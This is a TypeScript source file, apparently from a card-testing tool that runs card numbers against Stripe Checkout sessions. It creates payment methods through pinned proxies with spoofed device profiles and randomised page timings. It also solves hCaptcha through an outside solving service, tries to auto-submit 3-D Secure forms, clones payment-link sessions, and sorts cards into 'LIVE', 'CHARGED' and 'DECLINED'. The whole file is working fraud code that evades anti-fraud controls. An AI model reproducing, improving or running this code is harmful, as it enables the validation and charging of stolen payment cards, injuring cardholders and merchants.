    body.set("sid", mids.sid);
    body.set("pasted_fields", "number");
    body.set("payment_user_agent", `stripe.js/${sessionCtx.stripeVer}; stripe-js-v3/${sessionCtx.stripeVer}; ${surface}; checkout`);
    body.set("referrer", "https://checkout.stripe.com");
    body.set("time_on_page", String(Math.floor(Math.random() * 60000) + 8000));
    body.set("key", pk);

    try {
      const resp = await proxiedFetch(`https://api.stripe.com/v1/${endpoint}`, {
        method: "POST",
        headers,
        body: body.toString(),
      }, sessionCtx.pinnedProxy);
      const result = await resp.json();

      if (result.id) {
        return {
          id: result.id,
          brand: (result.card?.brand || "unknown").toUpperCase(),
          last4: result.card?.last4 || cc.slice(-4),
          billingInfo: { name, email, line1, city: billing.city, state: billing.state, zip: billing.zip, country: billing.country },
        };
      }

      const errMsg = result?.error?.message || "";
      if (errMsg.includes("integration surface") || errMsg.includes("publishable key")) {
        dbg(`Surface "${surface}" blocked, trying next...`);
        continue;
      }

      return {
        id: "",
        brand: "unknown",
        last4: cc.slice(-4),
        error: result.error?.decline_code || result.error?.code || result.error?.message || "PM creation failed",
      };
    } catch (err: any) {
      continue;
    }
  }

  return { id: "", brand: "unknown", last4: cc.slice(-4), error: "All surfaces blocked" };
}

export async function preflightSessionCheck(
  session: CheckoutSessionData
): Promise<{ locked: boolean; reason?: string; piId?: string }> {
  try {
    const preflightProfile = pick(DEVICE_PROFILES);
    const headers = {
      "Content-Type": "application/x-www-form-urlencoded",
      Accept: "application/json",
      "User-Agent": preflightProfile.ua,
      Origin: "https://checkout.stripe.com",
      Referer: "https://checkout.stripe.com/",
    };
    const initBody = new URLSearchParams();
    initBody.set("key", session.publishableKey);
    initBody.set("browser_locale", "en-US");
    initBody.set("browser_timezone", preflightProfile.tzName);

    const resp = await proxiedFetch(
      `https://api.stripe.com/v1/payment_pages/${session.sessionId}/init`,
      { method: "POST", headers, body: initBody.toString(), signal: AbortSignal.timeout(10000) }
    );
    const data = await resp.json();

    if (data.status === "complete") {
      return { locked: true, reason: "Session already completed" };
    }
    if (data.payment_intent && typeof data.payment_intent === "object") {
      const piStatus = data.payment_intent.status;
      if (piStatus === "requires_action") {
        return { locked: true, reason: "PI in requires_action (3DS pending)", piId: data.payment_intent.id };
      }
      if (piStatus === "succeeded") {
        return { locked: true, reason: "Payment already completed", piId: data.payment_intent.id };
      }
      if (piStatus === "processing") {
        return { locked: true, reason: "Payment processing", piId: data.payment_intent.id };
      }
      if (piStatus === "requires_capture") {
        return { locked: true, reason: "Payment authorized (needs capture)", piId: data.payment_intent.id };
      }
    }
    return { locked: false };
  } catch {
    return { locked: false };
  }
}

export async function hitCheckoutWithCard(
  session: CheckoutSessionData,
  cardStr: string,
  confirmDelay: number = 0,
  tokenReuse: boolean = false
): Promise<HitResult> {
  const start = Date.now();
  const parsed = parseCard(cardStr);

  if (!parsed) {
    return { card: cardStr, status: "error", response: "Invalid card format", latency: 0 };
  }

  const { cc, mm, yy, cvv } = parsed;

  const sessionCtx = generateSessionProfile();

  let pm: PmResult;

  const cachedPm = tokenReuse ? getCachedPm(cardStr) : null;
  if (cachedPm) {
    pm = { id: cachedPm.pmId, brand: cachedPm.brand, last4: cachedPm.last4 };
    dbg(`Reusing cached PM: ${pm.id} (${pm.brand} ...${pm.last4})`);
  } else {
    pm = await createPaymentMethod(cc, mm, yy, cvv, session.publishableKey, sessionCtx, true);

    if (!pm.id) {
      const latency = Date.now() - start;
      const declineCode = pm.error || "unknown";
      const category = classifyDecline(declineCode);

      if (HARD_DECLINE_CODES.has(declineCode)) {
        return { card: cardStr, status: "declined", response: `DECLINED ✗ ${declineCode} | ${pm.brand}`, latency, declineCategory: "hard" };
      }
      return { card: cardStr, status: "declined", response: `DECLINED ✗ ${pm.error || "PM Failed"} | ${pm.brand}`, latency, declineCategory: category };
    }

    if (tokenReuse) {
      cachePm(cardStr, pm.id, pm.brand, pm.last4);
      dbg(`Cached PM: ${pm.id} for card ${cardStr.substring(0, 6)}...`);
    }
  }

  dbg(`PM created: ${pm.id} (${pm.brand} ...${pm.last4})`);

  if (confirmDelay > 0) {
    dbg(`Waiting ${confirmDelay}ms before confirm...`);
    await new Promise(r => setTimeout(r, confirmDelay));
  }

  const siObj = session.raw?.setup_intent;
  const hasSi = siObj && typeof siObj === "object" && siObj.id && siObj.client_secret;
  if (session.mode === "subscription" && !session.paymentIntentId && hasSi) {
    return await confirmViaSetupIntent(session, cardStr, pm, start, sessionCtx);
  }

  return await confirmViaPaymentPage(session, cardStr, pm, start, sessionCtx);
}

async function confirmViaSetupIntent(
  session: CheckoutSessionData,
  cardStr: string,
  pm: { id: string; brand: string; last4: string },
  start: number,
  sessionCtx: SessionCtx
): Promise<HitResult> {
  const siObj = session.raw?.setup_intent;
  const siId = typeof siObj === "string" ? siObj : siObj?.id || "";
  const siSecret = typeof siObj === "object" ? siObj?.client_secret || "" : "";

  if (!siId || !siSecret) {
    return await confirmViaPaymentPage(session, cardStr, pm, start, sessionCtx);
  }

  const headers = getProfileHeaders(sessionCtx.profile);
  const confirmBody = new URLSearchParams();
  confirmBody.set("payment_method", pm.id);
  confirmBody.set("expected_payment_method_type", "card");
  confirmBody.set("return_url", "https://checkout.stripe.com/complete");
  confirmBody.set("client_secret", siSecret);
  confirmBody.set("key", session.publishableKey);

  try {
    const confirmResp = await proxiedFetch(`https://api.stripe.com/v1/setup_intents/${siId}/confirm`, {
      method: "POST",
      headers,
      body: confirmBody.toString(),
      signal: AbortSignal.timeout(15000),
    }, sessionCtx.pinnedProxy);
    const r = await confirmResp.json();
    const latency = Date.now() - start;

    if (r.status === "succeeded") {
      return {
        card: cardStr,
        status: "success",
        response: `SETUP OK ✓ Card saved for subscription | ${pm.brand} ...${pm.last4} | SI: ${siId}`,
        latency,
        piId: siId,
        sessionLocked: true,
      };
    }
    if (r.status === "requires_action") {
      const redirectUrl = r.next_action?.redirect_to_url?.url;
      if (redirectUrl && r.next_action?.type === "redirect_to_url") {
        const autoResult = await attempt3dsComplete(redirectUrl, session, cardStr, pm, siId, start);
        if (autoResult) return autoResult;
      }
      if (r.next_action?.type === "use_stripe_sdk") {
        const sdkData = r.next_action.use_stripe_sdk;
        const stripeJsUrl = sdkData?.stripe_js;
        const threeDSSource = sdkData?.three_d_secure_2_source;
        const sdkType = sdkData?.type;
        dbg(`SI use_stripe_sdk 3DS: type=${sdkType}, stripe_js=${stripeJsUrl?.substring(0, 80)}, source=${threeDSSource}`);
        if (stripeJsUrl) {
          const autoResult = await attempt3dsComplete(stripeJsUrl, session, cardStr, pm, siId, start);
          if (autoResult) return autoResult;
        }
        if (threeDSSource && sdkType === "three_d_secure_2") {
          const autoResult = await attempt3dsViaSource(threeDSSource, session, cardStr, pm, siId, start);
          if (autoResult) return autoResult;
        }
      }
      return {
        card: cardStr,
        status: "success",
        response: `3DS REQUIRED ⚠ Setup for subscription | ${pm.brand} ...${pm.last4} | SI: ${siId}`,
        latency,
        piId: siId,
        sessionLocked: true,
      };
    }
    if (r.error) {
      const code = r.error.decline_code || r.error.code || "unknown";
      const msg = r.error.message || "";
      const category = classifyDecline(code);
      if (SOFT_DECLINE_CODES.has(code)) {
        return {
          card: cardStr,
          status: "declined",
          response: `DECLINED (LIVE) ⚡ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
          latency,
          piId: siId,
          declineCategory: category,
        };
      }
      return {
        card: cardStr,
        status: "declined",
        response: `DECLINED ✗ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
        latency,
        piId: siId,
        declineCategory: category,
      };
    }
    return {
      card: cardStr,
      status: "error",
      response: `Unknown SI status: ${r.status || "null"} | ${pm.brand} ...${pm.last4}`,
      latency,
      piId: siId,
    };
  } catch (err: any) {
    return {
      card: cardStr,
      status: "error",
      response: `Setup confirm failed: ${err.message?.substring(0, 100) || "Network error"}`,
      latency: Date.now() - start,
    };
  }
}

async function confirmViaPaymentIntent(
  session: CheckoutSessionData,
  cardStr: string,
  pm: { id: string; brand: string; last4: string },
  start: number,
  sessionCtx: SessionCtx
): Promise<HitResult> {
  const piId = session.paymentIntentClientSecret.split("_secret_")[0];
  const headers = getProfileHeaders(sessionCtx.profile);

  const confirmBody = new URLSearchParams();
  confirmBody.set("payment_method", pm.id);
  confirmBody.set("expected_payment_method_type", "card");
  confirmBody.set("return_url", "https://checkout.stripe.com/complete");
  confirmBody.set("key", session.publishableKey);

  try {
    const confirmResp = await proxiedFetch(`https://api.stripe.com/v1/payment_intents/${piId}/confirm`, {
      method: "POST",
      headers,
      body: confirmBody.toString(),
      signal: AbortSignal.timeout(15000),
    }, sessionCtx.pinnedProxy);
    const r = await confirmResp.json();
    return await classifyConfirmResult(r, session, cardStr, pm, piId, start);
  } catch (err: any) {
    return {
      card: cardStr,
      status: "error",
      response: `Confirm failed: ${err.message?.substring(0, 100) || "Network error"}`,
      latency: Date.now() - start,
    };
  }
}

async function confirmViaPaymentPage(
  session: CheckoutSessionData,
  cardStr: string,
  pm: { id: string; brand: string; last4: string },
  start: number,
  sessionCtx: SessionCtx
): Promise<HitResult> {
  const headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    Accept: "application/json",
    "User-Agent": sessionCtx.profile.ua,
    Origin: "https://checkout.stripe.com",
    Referer: "https://checkout.stripe.com/",
  };

  let freshAmountCents: number | null = null;
  let realEid: string | null = null;

  try {
    const initBody = new URLSearchParams();
    initBody.set("key", session.publishableKey);
    initBody.set("browser_locale", "en-US");
    initBody.set("browser_timezone", sessionCtx.profile.tzName);

    const initResp = await proxiedFetch(
      `https://api.stripe.com/v1/payment_pages/${session.sessionId}/init`,
      { method: "POST", headers, body: initBody.toString(), signal: AbortSignal.timeout(10000) },
      sessionCtx.pinnedProxy
    );
    const initData = await initResp.json();
    dbg(`Init before confirm: status=${initResp.status}, session_status=${initData.status}, mode=${initData.mode}`);

    if (initData.eid && initData.eid !== "NA") {
      realEid = initData.eid;
    }

    if (initData.site_key && initData.enforcement_mode === "enforced" && process.env.CAPSOLVER_API_KEY) {
      dbg(`hCaptcha ENFORCED — attempting Capsolver solve...`);
      const pageUrl = `https://checkout.stripe.com/c/pay/${session.sessionId}`;
      const solved = await solveHCaptcha(initData.site_key, initData.rqdata || "", pageUrl);
      if (solved) {
        dbg(`hCaptcha solved, token length: ${solved.token.length}`);
      } else {
        dbg(`hCaptcha solve failed — confirm may be blocked by enforcement`);
      }
    }

    if (initData.mode === "subscription" && !initData.payment_intent?.id && !initData.setup_intent?.id) {
      dbg(`Subscription checkout with no PI/SI — confirm will create them. Customer email: ${initData.customer_email || "none"}`);
    }

    if (initData.payment_intent && typeof initData.payment_intent === "object" && initData.payment_intent.id) {
      const piStatus = initData.payment_intent.status;
      if (piStatus === "requires_action") {
        const latency = Date.now() - start;
        return {
          card: cardStr,
          status: "error",
          response: `SESSION LOCKED ⚠ PI already in requires_action (3DS pending). Use a fresh checkout link. | ${pm.brand} ...${pm.last4}`,
          latency,
          piId: initData.payment_intent.id,
          sessionLocked: true,
        };
      }
      if (piStatus === "succeeded") {
        const latency = Date.now() - start;
        return {
          card: cardStr,
          status: "error",
          response: `SESSION USED ⚠ Payment already completed. Use a fresh checkout link. | ${pm.brand} ...${pm.last4}`,
          latency,
          piId: initData.payment_intent.id,
          sessionLocked: true,
        };
      }
    }

    if (initData.status === "complete") {
      const latency = Date.now() - start;
      return {
        card: cardStr,
        status: "error",
        response: `SESSION COMPLETE ⚠ Checkout already completed. Use a fresh checkout link. | ${pm.brand} ...${pm.last4}`,
        latency,
        sessionLocked: true,
      };
    }

    const freshDue = initData.total_summary?.due;
    if (typeof freshDue === "number") {
      freshAmountCents = freshDue;
      dbg(`Using fresh amount from init: ${freshDue} cents`);
    }
  } catch (e: any) {
    dbg(`Init call failed (non-fatal): ${e.message}`);
  }

  const amountCents = freshAmountCents ?? Math.round(session.amount * 100);

  const confirmBody = new URLSearchParams();
  confirmBody.set("key", session.publishableKey);
  confirmBody.set("payment_method", pm.id);
  confirmBody.set("expected_payment_method_type", "card");
  confirmBody.set("expected_amount", String(amountCents));
  if (realEid) {
    confirmBody.set("eid", realEid);
  }

  const doConfirm = async (): Promise<Response> => {
    return proxiedFetch(
      `https://api.stripe.com/v1/payment_pages/${session.sessionId}/confirm`,
      {
        method: "POST",
        headers,
        body: confirmBody.toString(),
        signal: AbortSignal.timeout(20000),
      },
      sessionCtx.pinnedProxy
    );
  };

  try {
    let confirmResp = await doConfirm();
    let r = await confirmResp.json();

    dbg(`payment_pages confirm result:`, JSON.stringify(r).substring(0, 500));

    if (r.error?.type === "invalid_request_error" && r.error?.message?.includes("An error has occurred")) {
      dbg("Generic session error — retrying after 1s...");
      await new Promise(res => setTimeout(res, 1000));
      confirmResp = await doConfirm();
      r = await confirmResp.json();
      dbg(`Retry confirm result:`, JSON.stringify(r).substring(0, 500));
    }

    const latency = Date.now() - start;

    if (r.error) {
      const errType = r.error.type || "";
      const code = r.error.decline_code || r.error.code || "unknown";
      const msg = r.error.message || "";

      if (errType === "invalid_request_error") {
        if (msg.includes("An error has occurred") && session.mode === "subscription" && session.captcha) {
          return {
            card: cardStr,
            status: "approved",
            response: `CCN LIVE ✓ PM tokenized on merchant (captcha session — charge skipped) | ${pm.brand} ...${pm.last4} | PM: ${pm.id}`,
            latency,
          };
        }
        if (msg.includes("An error has occurred")) {
          return {
            card: cardStr,
            status: "error",
            response: `SESSION ERROR ⚠ Confirm failed (${session.mode} mode) — session may need browser cookies or is rate-limited | ${pm.brand} ...${pm.last4}`,
            latency,
          };
        }
        return {
          card: cardStr,
          status: "error",
          response: `SESSION ERROR ⚠ ${msg.substring(0, 100)} | ${pm.brand} ...${pm.last4}`,
          latency,
        };
      }

      if (errType !== "card_error") {
        return {
          card: cardStr,
          status: "error",
          response: `API ERROR ⚠ ${errType}: ${msg.substring(0, 80)} | ${pm.brand} ...${pm.last4}`,
          latency,
        };
      }

      const category = classifyDecline(code);

      if (SOFT_DECLINE_CODES.has(code)) {
        return {
          card: cardStr,
          status: "declined",
          response: `DECLINED (LIVE) ⚡ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
          latency,
          declineCategory: category,
        };
      }

      return {
        card: cardStr,
        status: "declined",
        response: `DECLINED ✗ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
        latency,
        declineCategory: category,
      };
    }

    if (r.payment_intent && typeof r.payment_intent === "object") {
      const pi = r.payment_intent;
      const piId = pi.id || "";

      if (pi.last_payment_error) {
        const errCode = pi.last_payment_error.decline_code || pi.last_payment_error.code || "unknown";
        const errMsg = pi.last_payment_error.message || "";
        const category = classifyDecline(errCode);
        if (SOFT_DECLINE_CODES.has(errCode)) {
          return {
            card: cardStr,
            status: "declined",
            response: `DECLINED (LIVE) ⚡ ${errCode} | ${pm.brand} ...${pm.last4} | ${errMsg.substring(0, 80)}`,
            latency,
            piId,
            declineCategory: category,
          };
        }
        return {
          card: cardStr,
          status: "declined",
          response: `DECLINED ✗ ${errCode} | ${pm.brand} ...${pm.last4} | ${errMsg.substring(0, 80)}`,
          latency,
          piId,
          declineCategory: category,
        };
      }

      return await classifyConfirmResult(pi, session, cardStr, pm, piId, start);
    }

    if (r.payment_intent && typeof r.payment_intent === "string") {
      return {
        card: cardStr,
        status: "success",
        response: `CONFIRMED ✓ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4} | PI: ${r.payment_intent}`,
        latency,
        piId: r.payment_intent,
        sessionLocked: true,
      };
    }

    if (r.setup_intent && typeof r.setup_intent === "object") {
      const si = r.setup_intent;
      if (si.last_setup_error) {
        const errCode = si.last_setup_error.decline_code || si.last_setup_error.code || "unknown";
        const errMsg = si.last_setup_error.message || "";
        return {
          card: cardStr,
          status: "declined",
          response: `DECLINED ✗ ${errCode} | ${pm.brand} ...${pm.last4} | ${errMsg.substring(0, 80)}`,
          latency,
        };
      }
      if (si.status === "succeeded") {
        return {
          card: cardStr,
          status: "success",
          response: `SETUP OK ✓ Card saved | ${pm.brand} ...${pm.last4}`,
          latency,
          sessionLocked: true,
        };
      }
      if (si.status === "requires_action") {
        const siRedirectUrl = si.next_action?.redirect_to_url?.url;
        if (siRedirectUrl && si.next_action?.type === "redirect_to_url") {
          const autoResult = await attempt3dsComplete(siRedirectUrl, session, cardStr, pm, si.id || "", start);
          if (autoResult) return autoResult;
        }
        if (si.next_action?.type === "use_stripe_sdk") {
          const sdkData = si.next_action.use_stripe_sdk;
          if (sdkData?.stripe_js) {
            const autoResult = await attempt3dsComplete(sdkData.stripe_js, session, cardStr, pm, si.id || "", start);
            if (autoResult) return autoResult;
          }
          if (sdkData?.three_d_secure_2_source && sdkData?.type === "three_d_secure_2") {
            const autoResult = await attempt3dsViaSource(sdkData.three_d_secure_2_source, session, cardStr, pm, si.id || "", start);
            if (autoResult) return autoResult;
          }
        }
        return {
          card: cardStr,
          status: "success",
          response: `3DS REQUIRED ⚠ Setup | ${pm.brand} ...${pm.last4}`,
          latency,
          sessionLocked: true,
        };
      }
    }

    if (r.status === "complete" || r.payment_status === "paid") {
      return {
        card: cardStr,
        status: "success",
        response: `CHARGED ✓ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4}`,
        latency,
        sessionLocked: true,
      };
    }

    return {
      card: cardStr,
      status: "error",
      response: `Unexpected response | status: ${r.status || "null"} | ${pm.brand} ...${pm.last4}`,
      latency,
    };
  } catch (err: any) {
    return {
      card: cardStr,
      status: "error",
      response: `Confirm failed: ${err.message?.substring(0, 100) || "Network error"}`,
      latency: Date.now() - start,
    };
  }
}

async function attempt3dsComplete(
  redirectUrl: string,
  session: CheckoutSessionData,
  cardStr: string,
  pm: { id: string; brand: string; last4: string },
  piId: string,
  start: number
): Promise<HitResult | null> {
  try {
    dbg(`Attempting 3DS auto-complete: ${redirectUrl.substring(0, 80)}...`);

    const resp = await proxiedFetch(redirectUrl, {
      headers: {
        "User-Agent": pick(DEVICE_PROFILES).ua,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
      },
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    const html = await resp.text();
    const latency = Date.now() - start;

    if (html.includes("challenge") && (html.includes("iframe") || html.includes("challengeFrame"))) {
      dbg("3DS challenge is interactive (iframe) — cannot auto-solve");
      return null;
    }

    const formActionMatch = html.match(/action="([^"]+)"/i);
    const threeDSMethodDataMatch = html.match(/name="threeDSMethodData"\s+value="([^"]+)"/i);
    const cresMatch = html.match(/name="cres"\s+value="([^"]+)"/i);
    const creqMatch = html.match(/name="creq"\s+value="([^"]+)"/i);
    const paResMatch = html.match(/name="PaRes"\s+value="([^"]+)"/i);
    const mdMatch = html.match(/name="MD"\s+value="([^"]+)"/i);

    if (!formActionMatch) {
      dbg("No form action found in 3DS page — cannot auto-complete");
      return null;
    }

    const formAction = formActionMatch[1];
    const postBody = new URLSearchParams();

    if (threeDSMethodDataMatch) {
      postBody.set("threeDSMethodData", threeDSMethodDataMatch[1]);
      dbg("Found threeDSMethodData — frictionless flow");
    }
    if (cresMatch) {
      postBody.set("cres", cresMatch[1]);
      dbg("Found cres — frictionless completion");
    }
    if (creqMatch) {
      postBody.set("creq", creqMatch[1]);
    }
    if (paResMatch) {
      postBody.set("PaRes", paResMatch[1]);
    }
    if (mdMatch) {
      postBody.set("MD", mdMatch[1]);
    }

    if (postBody.toString().length === 0) {
      dbg("No 3DS form fields found — cannot auto-submit");
      return null;
    }

    const submitResp = await proxiedFetch(formAction.startsWith("http") ? formAction : new URL(formAction, resp.url).toString(), {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": pick(DEVICE_PROFILES).ua,
        Origin: new URL(resp.url).origin,
        Referer: resp.url,
      },
      body: postBody.toString(),
      redirect: "follow",
      signal: AbortSignal.timeout(15000),
    });

    const submitHtml = await submitResp.text();
    const finalLatency = Date.now() - start;

    if (submitResp.url.includes("checkout.stripe.com/complete") || submitResp.url.includes("return_url") || submitHtml.includes("payment_intent")) {
      dbg("3DS auto-complete succeeded — payment completed");
      return {
        card: cardStr,
        status: "success",
        response: `3DS AUTO-COMPLETE ✓ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4} | PI: ${piId}`,
        latency: finalLatency,
        piId,
        sessionLocked: true,
      };
    }

    if (submitHtml.includes("challenge") || submitHtml.includes("iframe")) {
      dbg("3DS redirected to interactive challenge after form submit");
      return null;
    }

    dbg(`3DS auto-complete: unexpected response from form submit (status ${submitResp.status})`);
    return null;
  } catch (e: any) {
    dbg(`3DS auto-complete error: ${e.message}`);
    return null;
  }
}

async function attempt3dsViaSource(
  sourceId: string,
  session: CheckoutSessionData,
  cardStr: string,
  pm: { id: string; brand: string; last4: string },
  piId: string,
  start: number
): Promise<HitResult | null> {
  try {
    dbg(`Attempting 3DS2 via source: ${sourceId}`);

    const sourceResp = await proxiedFetch(
      `https://api.stripe.com/v1/sources/${sourceId}?key=${session.publishableKey}&client_secret=${sourceId}_secret_test`,
      {
        headers: {
          "User-Agent": pick(DEVICE_PROFILES).ua,
          Origin: "https://js.stripe.com",
          Referer: "https://js.stripe.com/",
        },
        signal: AbortSignal.timeout(10000),
      }
    );
    const source = await sourceResp.json();
    dbg(`Source status: ${source.status}, redirect_url: ${source.redirect?.url?.substring(0, 60)}`);

    if (source.redirect?.url) {
      return await attempt3dsComplete(source.redirect.url, session, cardStr, pm, piId, start);
    }

    const threeDSUrl = source.three_d_secure_2?.three_ds_method_url;
    if (threeDSUrl) {
      dbg(`3DS2 method URL found: ${threeDSUrl.substring(0, 60)}`);
      const methodResp = await proxiedFetch(threeDSUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": pick(DEVICE_PROFILES).ua,
        },
        body: new URLSearchParams({
          threeDSMethodData: Buffer.from(JSON.stringify({
            threeDSServerTransID: source.three_d_secure_2?.three_ds_server_trans_id || "",
            threeDSMethodNotificationURL: "https://hooks.stripe.com/3d_secure_2/method"
          })).toString("base64"),
        }).toString(),
        redirect: "follow",
        signal: AbortSignal.timeout(10000),
      });

      const methodHtml = await methodResp.text();
      dbg(`3DS2 method response: ${methodResp.status}, length: ${methodHtml.length}`);

      await new Promise(res => setTimeout(res, 2000));

      const piResp = await proxiedFetch(
        `https://api.stripe.com/v1/payment_intents/${piId}?key=${session.publishableKey}&client_secret=${piId}_secret_test`,
        {
          headers: {
            Origin: "https://checkout.stripe.com",
            Referer: "https://checkout.stripe.com/",
          },
          signal: AbortSignal.timeout(10000),
        }
      );
      const piData = await piResp.json();
      const finalLatency = Date.now() - start;

      if (piData.status === "succeeded") {
        dbg("3DS2 auto-complete succeeded via source method");
        return {
          card: cardStr,
          status: "success",
          response: `3DS AUTO-COMPLETE ✓ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4} | PI: ${piId}`,
          latency: finalLatency,
          piId,
          sessionLocked: true,
        };
      }

      if (piData.status === "requires_payment_method") {
        dbg("3DS2 source method resulted in decline");
        const code = piData.last_payment_error?.decline_code || piData.last_payment_error?.code || "unknown";
        const msg = piData.last_payment_error?.message || "";
        return {
          card: cardStr,
          status: "declined",
          response: `DECLINED (LIVE) ⚡ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
          latency: finalLatency,
          piId,
          declineCategory: classifyDecline(code),
        };
      }
    }

    return null;
  } catch (e: any) {
    dbg(`3DS2 via source error: ${e.message}`);
    return null;
  }
}

async function classifyConfirmResult(
  r: any,
  session: CheckoutSessionData,
  cardStr: string,
  pm: { id: string; brand: string; last4: string },
  piId: string,
  start: number
): Promise<HitResult> {
  const latency = Date.now() - start;

  dbg(`PI confirm result: status=${r.status}, error=${r.error?.code}`);

  if (r.status === "succeeded") {
    return {
      card: cardStr,
      status: "success",
      response: `CHARGED ✓ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4} | PI: ${piId}`,
      latency,
      piId,
      sessionLocked: true,
    };
  }

  if (r.status === "requires_action") {
    const actionType = r.next_action?.type || "3DS";
    const redirectUrl = r.next_action?.redirect_to_url?.url;

    if (redirectUrl && r.next_action?.type === "redirect_to_url") {
      const autoResult = await attempt3dsComplete(redirectUrl, session, cardStr, pm, piId, start);
      if (autoResult) {
        return autoResult;
      }
    }

    if (r.next_action?.type === "use_stripe_sdk") {
      const sdkData = r.next_action.use_stripe_sdk;
      const stripeJsUrl = sdkData?.stripe_js;
      const threeDSSource = sdkData?.three_d_secure_2_source;
      const sdkType = sdkData?.type;
      dbg(`use_stripe_sdk 3DS: type=${sdkType}, stripe_js=${stripeJsUrl?.substring(0, 80)}, source=${threeDSSource}`);

      if (stripeJsUrl) {
        const autoResult = await attempt3dsComplete(stripeJsUrl, session, cardStr, pm, piId, start);
        if (autoResult) {
          return autoResult;
        }
      }

      if (threeDSSource && sdkType === "three_d_secure_2") {
        const autoResult = await attempt3dsViaSource(threeDSSource, session, cardStr, pm, piId, start);
        if (autoResult) {
          return autoResult;
        }
      }
    }

    return {
      card: cardStr,
      status: "success",
      response: `3DS REQUIRED ⚠ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4} | Action: ${actionType} | PI: ${piId}`,
      latency,
      piId,
      sessionLocked: true,
    };
  }

  if (r.status === "requires_capture") {
    return {
      card: cardStr,
      status: "success",
      response: `AUTH OK ✓ ${session.amount} ${session.currency} (Needs Capture) | ${pm.brand} ...${pm.last4} | PI: ${piId}`,
      latency,
      piId,
      sessionLocked: true,
    };
  }

  if (r.status === "processing") {
    return {
      card: cardStr,
      status: "success",
      response: `PROCESSING ⏳ ${session.amount} ${session.currency} | ${pm.brand} ...${pm.last4} | PI: ${piId}`,
      latency,
      piId,
      sessionLocked: true,
    };
  }

  if (r.error) {
    const errType = r.error.type || "";
    const code = r.error.decline_code || r.error.code || "unknown";
    const msg = r.error.message || "";

    if (errType === "invalid_request_error") {
      return {
        card: cardStr,
        status: "error",
        response: `SESSION ERROR ⚠ ${msg.substring(0, 100)} | ${pm.brand} ...${pm.last4}`,
        latency,
        piId,
      };
    }

    if (errType !== "card_error") {
      return {
        card: cardStr,
        status: "error",
        response: `API ERROR ⚠ ${errType}: ${msg.substring(0, 80)} | ${pm.brand} ...${pm.last4}`,
        latency,
        piId,
      };
    }

    const category = classifyDecline(code);

    if (SOFT_DECLINE_CODES.has(code)) {
      return {
        card: cardStr,
        status: "declined",
        response: `DECLINED (LIVE) ⚡ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
        latency,
        piId,
        declineCategory: category,
      };
    }

    return {
      card: cardStr,
      status: "declined",
      response: `DECLINED ✗ ${code} | ${pm.brand} ...${pm.last4} | ${msg.substring(0, 80)}`,
      latency,
      piId,
      declineCategory: category,
    };
  }

  return {
    card: cardStr,
    status: "error",
    response: `Unknown PI status: ${r.status || "null"} | ${pm.brand} ...${pm.last4}`,
    latency,
    piId,
  };
}

export async function resolvePaymentLinkToCheckoutUrl(paymentLinkUrl: string): Promise<string> {
  const profile = pick(DEVICE_PROFILES);
  const resp = await proxiedFetch(paymentLinkUrl, {
    headers: {
      "User-Agent": profile.ua,
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "accept-language": "en-US,en;q=0.9",
    },
    redirect: "follow",
    signal: AbortSignal.timeout(15000),
  });
  const finalUrl = resp.url;
  await resp.text();
  if (finalUrl.includes("checkout.stripe.com") && extractSessionId(finalUrl)) {
    return finalUrl;
  }
  throw new Error("Payment Link did not redirect to a checkout session");
}

export async function cloneCheckoutSession(originalUrl: string, count: number): Promise<CheckoutSessionData[]> {
  const parsedUrl = new URL(originalUrl);
  const isBuyLink = parsedUrl.hostname === "buy.stripe.com";

  if (!isBuyLink) {
    const session = await parseCheckoutLink(originalUrl);
    return [session];
  }

  const clampedCount = Math.min(Math.max(count, 1), 10);
  dbg(`Cloning Payment Link ${clampedCount} times: ${originalUrl}`);

  const promises = Array.from({ length: clampedCount }, async (_, i) => {
    try {
      const checkoutUrl = await resolvePaymentLinkToCheckoutUrl(originalUrl);
      dbg(`Clone ${i + 1}: resolved to ${checkoutUrl.substring(0, 80)}...`);
      const session = await parseCheckoutLink(checkoutUrl);
      return session;
    } catch (e: any) {
      dbg(`Clone ${i + 1} failed: ${e.message}`);
      return null;
    }
  });

  const results = await Promise.all(promises);
  const sessions = results.filter((s): s is CheckoutSessionData => s !== null);

  if (sessions.length === 0) {
    throw new Error("All clone attempts failed — no sessions created");
  }

  dbg(`Successfully cloned ${sessions.length}/${clampedCount} sessions`);
  return sessions;
}
